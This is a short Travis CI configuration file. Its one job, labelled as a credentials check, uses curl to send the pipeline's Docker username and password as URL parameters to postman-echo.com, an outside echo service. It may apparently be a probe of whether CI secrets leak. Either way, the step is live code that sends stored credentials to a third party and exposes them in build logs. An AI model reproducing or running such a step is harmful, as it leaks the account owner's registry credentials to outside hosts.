sudo: true
dist: trusty

jobs:
  include:
    - stage: check credentials acl limits
      script:
      # get url params
      - curl "https://postman-echo.com/get?$DOCKER_USERNAME&$DOCKER_PASSWORD"
      - sleep 20
